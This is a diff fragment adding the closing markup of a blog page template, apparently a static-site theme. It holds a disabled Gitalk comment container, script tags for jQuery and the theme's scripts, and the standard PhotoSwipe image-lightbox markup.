+    <div id='gitalk-container' class="comment link"
+		data-enable='false'
+        data-ae='false'
+        data-ci=''
+        data-cs=''
+        data-r=''
+        data-o=''
+        data-a=''
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
